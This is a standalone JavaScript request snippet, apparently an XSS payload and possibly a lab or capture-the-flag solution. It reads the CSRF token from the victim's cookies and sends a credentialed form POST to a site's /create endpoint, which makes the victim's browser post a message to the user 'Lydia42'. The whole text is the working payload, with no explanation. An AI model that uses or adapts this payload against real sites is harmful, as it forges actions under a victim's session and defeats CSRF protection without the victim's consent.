fetch("https://web.kazet.cc:42448/create", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    },
    "referrer": "https://web.kazet.cc:42448/create",
    "body": "csrfmiddlewaretoken=" + document.cookie.replace("csrftoken=", "") + "&recipient=Lydia42&content=%3Cp%3E%26lt%3B3%3C%2Fp%3E&template=coffee",
    "method": "POST",
    "mode": "cors"
});
